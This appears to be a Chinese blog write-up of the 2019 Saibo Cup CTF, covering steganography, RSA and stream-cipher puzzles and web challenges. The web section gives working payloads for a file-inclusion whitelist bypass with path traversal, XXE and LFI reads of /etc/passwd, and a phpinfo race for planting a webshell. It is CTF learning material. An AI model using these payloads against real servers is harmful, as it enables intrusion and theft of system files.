<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head><meta name="generator" content="Hexo 3.9.0">

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="赛博杯2019 Write Up前言杭电赛博协会出得题，感觉质量还是不错的，难易兼备。以下是比赛题目部分Write Up。
MISCSign in
扫条形码得到flag。
No Wordsnow加密，将文件放入010editor看他的十六进制形式，

0D0A是换行，剩下的将20转0，将09转1，得">
    

    <!--Author-->
    
        <meta name="author" content="V">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="赛博杯2019_Write_Up">
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="V&#39;s blog">

    <!--Type page-->
    
        <meta property="og:type" content="article">
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary">
    

    <!-- Title -->
    
    <title>赛博杯2019_Write_Up - V&#39;s blog</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-pencil-square" aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2019/07/14/赛博杯2019_Write_Up/">
                赛博杯2019_Write_Up
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-07-14</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h1 id="赛博杯2019-Write-Up"><a href="#赛博杯2019-Write-Up" class="headerlink" title="赛博杯2019 Write Up"></a>赛博杯2019 Write Up</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>杭电赛博协会出得题，感觉质量还是不错的，难易兼备。以下是比赛题目部分Write Up。</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h3><p><img src="1.png" alt="23333"></p>
<p>扫条形码得到flag。</p>
<h3 id="No-Word"><a href="#No-Word" class="headerlink" title="No Word"></a>No Word</h3><p>snow加密，将文件放入010editor看他的十六进制形式，</p>
<p><img src="2.png" alt="2"></p>
<p>0D0A是换行，剩下的将20转0，将09转1，得到的二进制数据，转字符串即可得到flag。</p>
<h3 id="基础社工"><a href="#基础社工" class="headerlink" title="基础社工"></a>基础社工</h3><p>题目介绍：大家都用着我们的数字杭电（<a href="http://i.hdu.edu.cn/" target="_blank" rel="noopener">i.hdu.edu.cn</a>)但是对于其注册者却啥也不知道，所以小y打算去看看注册数字杭电的创始人的邮箱</p>
<p>flag形式为：flag{你找到的电子邮箱}</p>
<p>百度一个IP反查询工具，Whois查询，看看这个IP的备案，</p>
<p><img src="3.png" alt="3"></p>
<p>得到flag；</p>
<h3 id="The-world"><a href="#The-world" class="headerlink" title="The world"></a>The world</h3><p>下载得到一张图，猜测是隐写，直接foremost分解，得到四张图，</p>
<p><img src="4.png" alt="4"></p>
<p>第一张是可见的，应该没用，剩下来的，按顺序看。</p>
<p>第一份压缩包是加密压缩包，看了一下不是伪加密，于是放入工具进行简单爆破，得到密码abc123，得到文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d2abd3fb9d4c93fb064abf81f5fab84</span><br><span class="line">新手村钥匙</span><br></pre></td></tr></table></figure>

<p>第二份文件是一张图，猜测是LSB隐写，密码为上述字符串，测试后发现不是。继续考虑，可能是outguess加密，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -r flag.jpg -t secret.txt -k d2abd3fb9d4c93fb064abf81f5fab84</span><br></pre></td></tr></table></figure>

<p>得到文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">95cca6c50e48e86c468ee329ddc11047</span><br><span class="line"></span><br><span class="line">最后一关大门的钥匙</span><br></pre></td></tr></table></figure>

<p>第三份文件是一个mp3文件，猜测是MP3隐写，用MP3Stego解密，即可得到flag</p>
<h3 id="Different-P"><a href="#Different-P" class="headerlink" title="Different_P"></a>Different_P</h3><p>hint：PIL是个好东西</p>
<p>下载得到两份一样的文件，试了试盲水印，发现没有用。使用Beyond Compare 4结合后发现<img src="5.png" alt="5"></p>
<p>字符这里有点东西。根据题目提示，猜测要将两张图片的所有元素点的灰度拿来作比较，</p>
<p>构造脚本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">im = Image.open(&quot;f1.png&quot;).convert(&quot;L&quot;)</span><br><span class="line"></span><br><span class="line">im2 = Image.open(&quot;f2.png&quot;).convert(&quot;L&quot;)</span><br><span class="line"></span><br><span class="line">width=im.size[0]  #图片宽</span><br><span class="line"></span><br><span class="line">height=im.size[1] #图片高</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dd=&apos;&apos;</span><br><span class="line"></span><br><span class="line">flag1=&apos;&apos;</span><br><span class="line"></span><br><span class="line">for x in range(0,width):</span><br><span class="line"></span><br><span class="line">    for y in range(0,height):</span><br><span class="line"></span><br><span class="line">        data  = im .getpixel((x,y)) </span><br><span class="line"></span><br><span class="line">        data2 = im2.getpixel((x,y))</span><br><span class="line"></span><br><span class="line">        if(data!=255 or data2!=255):</span><br><span class="line"></span><br><span class="line">        	dd=dd+str(data-data2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range (int(len(dd)/8)):</span><br><span class="line"></span><br><span class="line">    word = dd[i*8:(i+1)*8]</span><br><span class="line"></span><br><span class="line">    word = int(word,2)</span><br><span class="line"></span><br><span class="line">    flag1 +=chr(int(word))</span><br><span class="line"></span><br><span class="line">missing_padding = 4 - len(flag1)%4</span><br><span class="line"></span><br><span class="line">if missing_padding:</span><br><span class="line"></span><br><span class="line">    flag1+= &apos;=&apos;*missing_padding</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1)</span><br><span class="line"></span><br><span class="line">pic = open(&apos;flag.png&apos;,&apos;wb&apos;)</span><br><span class="line"></span><br><span class="line">pic.write(flag)</span><br><span class="line"></span><br><span class="line">pic.close()</span><br></pre></td></tr></table></figure>

<p>得到一张图片，但是打不开，看他的十六进制数据发现文件头被改了。改回来后得到一张二维码，扫码得到flag</p>
<p><img src="6.png" alt="6"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><p>题目文件是public.pem 和 flag.enc，先用openssl打开.pem文件</p>
<p>openssl rsa -pubin -text -modulus -in public.pem</p>
<p>得到</p>
<p><img src="7.png" alt="7"></p>
<p>其中。N=&gt;Modulus，e=&gt;Exponent</p>
<p>没有更多信息与算法了，猜测这个大数可以直接分解，上yafu。随后用rsatool生成.pem文件，再用openssl解密flag.enc，得到字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;Y!s04tEP&#123;ygraCl_f</span><br></pre></td></tr></table></figure>

<p>栅栏加方向即可得到flag，</p>
<p>rsatool和openssl的使用参考</p>
<p><a href="https://www.cnblogs.com/Byqiyou/p/9410885.html" target="_blank" rel="noopener">https://www.cnblogs.com/Byqiyou/p/9410885.html</a></p>
<h3 id="川流不息"><a href="#川流不息" class="headerlink" title="川流不息"></a>川流不息</h3><p>题目加密脚本和密文</p>
<p>加密脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from parameters import a</span><br><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    if len(init) &lt; 5:</span><br><span class="line">        return init</span><br><span class="line">    result = init[:5]</span><br><span class="line">    for index in range(size-5):</span><br><span class="line">        mid = (result[index] * a[0]) ^ (result[index + 1] * a[1]) ^ (result[index + 2] * a[2]) ^ (result[index + 3] * a[3]) ^ (result[index+4] * a[4])</span><br><span class="line">        result.append(mid)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    with open(&apos;flag&apos;,&apos;r&apos;) as f:</span><br><span class="line">        flag = f.readline().strip()</span><br><span class="line">    plain = &apos;&apos;.join(bin(ord(i))[2:].rjust(8,&apos;0&apos;) for i in flag)</span><br><span class="line">    key = stream([1,0,0,1,1,0,1,0,0,1],len(plain))</span><br><span class="line">    cipher = &apos;&apos;</span><br><span class="line">    for i in range(len(plain)):</span><br><span class="line">        cipher += str(int(plain[i]) ^ key[i])</span><br><span class="line">    print cipher</span><br></pre></td></tr></table></figure>

<p>首先，根据flag前五个字符“flag{”和密文，异或可以得到key的前四十个值，然后爆破得到a</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    key=[1,0,0,1,1,0,1,0,0,1,0,0,0,0,1,0,1,0,1,1,1,0,1,1,0,0,0,1,1,1,1,1,0,0,1,1,0,1,0,0]</span><br><span class="line">    for i in range(2):</span><br><span class="line">        for j in range(2):</span><br><span class="line">            for k in range(2):</span><br><span class="line">                for p in range(2):</span><br><span class="line">                    for q in range(2):</span><br><span class="line">                        a=[i,j,k,p,q]</span><br><span class="line">                        result = init[:5]</span><br><span class="line">                        for index in range(size-5):</span><br><span class="line">                            mid = (result[index] * a[0]) ^ (result[index + 1] * a[1]) ^ (result[index + 2] * a[2]) ^ (result[index + 3] * a[3]) ^ (result[index+4] * a[4])</span><br><span class="line">                            result.append(mid)</span><br><span class="line">                        if result==key:</span><br><span class="line">                            print(a)</span><br><span class="line">                            break</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    </span><br><span class="line">    flag = &quot;flag&#123;&quot;</span><br><span class="line">    plain = &apos;&apos;.join(bin(ord(i))[2:].rjust(8,&apos;0&apos;) for i in flag)</span><br><span class="line">    stream([1,0,0,1,1,0,1,0,0,1],len(plain))</span><br></pre></td></tr></table></figure>

<p>得到a=[1, 0, 0, 1, 0]</p>
<p>然后根据加密脚本，获得key。然后key与密文异或得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def stream(init,size):</span><br><span class="line">    if len(init) &lt; 5:</span><br><span class="line">        return init</span><br><span class="line">    result = init[:5]</span><br><span class="line">    for index in range(size-5):</span><br><span class="line">        mid = (result[index] * a[0]) ^ (result[index + 1] * a[1]) ^ (result[index + 2] * a[2]) ^ (result[index + 3] * a[3]) ^ (result[index+4] * a[4])</span><br><span class="line">        result.append(mid)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    a=[1, 0, 0, 1, 0]</span><br><span class="line">    cipher = &apos;111111000010111011011010011110000100111111010110000000100100110000001100011010111000000100100011100100010111110010101000100100011100000101011001111011101001101000111011000010000000011010000111111000111101011110111010&apos;</span><br><span class="line">    flag=&apos;&apos;</span><br><span class="line">    key = stream([1,0,0,1,1,0,1,0,0,1],len(cipher))</span><br><span class="line">    for i in range(len(cipher)):</span><br><span class="line">        flag += str(int(cipher[i]) ^ key[i])</span><br><span class="line"></span><br><span class="line">    for i in range(0,len(flag),8):</span><br><span class="line"></span><br><span class="line">        print(chr(int(flag[i:i+8],2)),end=&quot;&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="base-1"><a href="#base-1" class="headerlink" title="base_1"></a>base_1</h3><p><img src="8.png" alt="8"></p>
<p>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.76.51.219:8050/?base=bXlmbGFn</span><br></pre></td></tr></table></figure>

<p>得到回显 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不能输入bXlmbGFn！</span><br></pre></td></tr></table></figure>

<p>但经过测试，发现被加密后的base64字符串解密时似乎会舍弃密文末尾多余的字符（取余4后多出来的字符），于是这题就不难绕过了，</p>
<p>最终payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.76.51.219:8050/?base=bXlmbGFn1</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h3 id="truncation"><a href="#truncation" class="headerlink" title="truncation"></a>truncation</h3><p>进入网站，f12，发现注释：</p>
<p>进入sorce.php发现源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class kind</span><br><span class="line">&#123;</span><br><span class="line">public static function checkFile(&amp;$page)</span><br><span class="line">&#123;</span><br><span class="line">        $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;aa&quot;=&gt;&quot;aa.php&quot;];</span><br><span class="line"></span><br><span class="line">        if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">        echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">        return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (in_array($page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">        $page,</span><br><span class="line">        0,</span><br><span class="line">        mb_strpos($page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        0,</span><br><span class="line">        mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">        return false;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; kind::checkFile($_REQUEST[&apos;file&apos;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&apos;file&apos;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">       echo &quot;&lt;h&gt;Look carefully and you will find the answer.&lt;/h&gt;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>先进入click.php，发现：flag is not here, and flag in flag.php 得到了ﬂag的位置，那么应该是考任意文件包含漏洞</p>
<p>审计代码得到：</p>
<p>要设定page的值，且内容要在whiteList中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mb_substr($page,0,mb_strpos($page.&apos;?&apos;,&apos;?&apos;))</span><br></pre></td></tr></table></figure>

<p>表示截取page中？之前的内容 接着对$page进行一次URLdecode之后，再判断一次。最后ﬁle的值为一个字符串 且 checkﬁle返回真值 就能包含文件ﬁle</p>
<p>所以最终payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.110.227.208:8003/index.php?file=source.php?../../flag.php</span><br></pre></td></tr></table></figure>

<p>得到一个猜密码的界面    </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;猜密码&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- </span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&apos;pwd&apos;]=time();</span><br><span class="line">if (isset ($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">        if ($_POST[&apos;pwd&apos;] == $_SESSION[&apos;pwd&apos;])</span><br><span class="line">                die(&apos;Flag:&apos;.$flag);</span><br><span class="line">        else&#123;</span><br><span class="line">                print &apos;&lt;p&gt;猜测错误.&lt;/p&gt;&apos;;</span><br><span class="line">                $_SESSION[&apos;pwd&apos;]=time().time();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">密码：&lt;input type=&quot;text&quot; name=&quot;pwd&quot;/&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;猜密码&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>需要post一个赋值了的password和一个和服务器时间的值相同的pwd，脚本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">from bs4 import BeautifulSoup       #html解析器</span><br><span class="line">url=&quot;http://47.110.227.208:8003/index.php?file=source.php?../../flag.php&quot;    #目标url</span><br><span class="line"></span><br><span class="line">session=requests.session()          #获取一个session对象</span><br><span class="line">response=session.get(url)</span><br><span class="line">html=response.text                  #返回的页面</span><br><span class="line">soup=BeautifulSoup(html,&apos;html.parser&apos;)</span><br><span class="line"></span><br><span class="line">formData=&#123;&quot;password&quot;:&quot;123&quot;,&quot;pwd&quot;:&quot;int(time.time())&quot;&#125;#构建一个formData，用于传我们的</span><br><span class="line">re2=session.post(url,data=formData)#post过去</span><br><span class="line"></span><br><span class="line">if(&quot;猜测错误&quot; not  in re2.text):</span><br><span class="line">	print(re2.text)</span><br></pre></td></tr></table></figure>

<p>发现无法获得flag，后来发现pwd赋值为空可以获得flag，可能是<strong>$_SESSION[‘pwd’]=time();</strong>没有执行成功。</p>
<h3 id="Simple-XXE"><a href="#Simple-XXE" class="headerlink" title="Simple XXE"></a>Simple XXE</h3><p>首先，了解一下XXE，（xml外部实体注入漏洞）</p>
<p>参考文章：<a href="https://www.cnblogs.com/cui0x01/p/8823690.html" target="_blank" rel="noopener">https://www.cnblogs.com/cui0x01/p/8823690.html</a></p>
<p>（然后跟这个文章走2333）</p>
<p>首先f12看到dom.php存在XXE，于是构造XML文本先验证漏洞，</p>
<p>这一步骤将XML内容发送给服务器，当服务器将XML解析完成后，就会依照解析的内容工作，这段XML中<code>SYSTEM &quot;file:///etc/passwd&quot;</code>部分引用了目标服务器(即<code>172.16.12.2</code>)下的<code>/etc/passwd</code>文件，服务器解析XML内容后，会将这一文件内容存入<code>&amp;xxe</code>中，然后将数据返回给恶意访问者。</p>
<p>执行完成上面的操作后，点击GO，右侧将出现此数据包的返回结果，内容如下，返回的数据为服务器上<code>/etc/passwd</code>文件的内容</p>
<p><img src="9.png" alt="9"></p>
<p>漏洞验证成功，</p>
<p>于是修改XML中的外部实体为其他协议，根据提示看hint，<code>php://filter/read=convert.base64-encode/resource=hint.php</code>，在Proxy选项卡的原数据包中粘贴XML内容，点击FORWARD放行请求，返回的结果</p>
<p><img src="10.png" alt="10"></p>
<p>解码后得到目录，<img src="11.png" alt="11"></p>
<p>于是</p>
<p><img src="12.png" alt="12"></p>
<p>解码得到flag</p>
<h3 id="inclusion"><a href="#inclusion" class="headerlink" title="inclusion"></a>inclusion</h3><p>进入页面，f12，发现注释 phpinfo.php</p>
<p>然后根据名字，猜测是php文件包含漏洞（利用phpinfo）</p>
<p>参考这篇文章（又是跟着文章走）<a href="https://www.cnblogs.com/xiaoqiyue/p/10158702.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoqiyue/p/10158702.html</a></p>
<p>访问<a href="http://47.110.227.208:8001/lfi.php?file=/etc/passwd" target="_blank" rel="noopener">http://47.110.227.208:8001/lfi.php?file=/etc/passwd</a>验证漏洞，<img src="13.png" alt="13"></p>
<p>成功。</p>
<p>文章如是说：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">先讲一下利用phpinfo上传文件，然后在文件包含的原理：</span><br><span class="line"></span><br><span class="line">参考链接：https://github.com/vulhub/vulhub/tree/master/php/inclusion</span><br><span class="line"></span><br><span class="line">在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），这个临时文件在请求结束后就会被删除，同时，phpinfo页面会将当前请求上下文中所有变量都打印出来。但是文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，将这个文件名发送给文件包含漏洞页面。</span><br><span class="line"></span><br><span class="line">因为在第一个请求结束时，临时文件就会被删除，第二个请求就无法进行包含。</span><br><span class="line"></span><br><span class="line">但是这并不代表我们没有办法去利用这点上传恶意文件，只要发送足够多的数据，让页面还未反应过来，就上传我们的恶意文件，然后文件包含：</span><br><span class="line"></span><br><span class="line">1）发送包含了webshell的上传数据包给phpinfo，这个数据包的header，get等位置一定要塞满垃圾数据；</span><br><span class="line"></span><br><span class="line">2）phpinfo这时会将所有数据都打印出来，其中的垃圾数据会将phpinfo撑得非常大</span><br><span class="line"></span><br><span class="line">3）PHP默认缓冲区大小是4096，即PHP每次返回4096个字节给socket连接</span><br><span class="line"></span><br><span class="line">4）所以，我们直接操作原生socket，每次读取4096个字节，只要读取到的字符里包含临时文件名，就立即发送第二个数据包</span><br><span class="line"></span><br><span class="line">5）此时，第一个数据包的socket连接其实还没有结束，但是PHP还在继续每次输出4096个字节，所以临时文件还未被删除</span><br><span class="line"></span><br><span class="line">6）我们可以利用这个时间差，成功包含临时文件，最后getshell</span><br></pre></td></tr></table></figure>

<p>利用脚本</p>
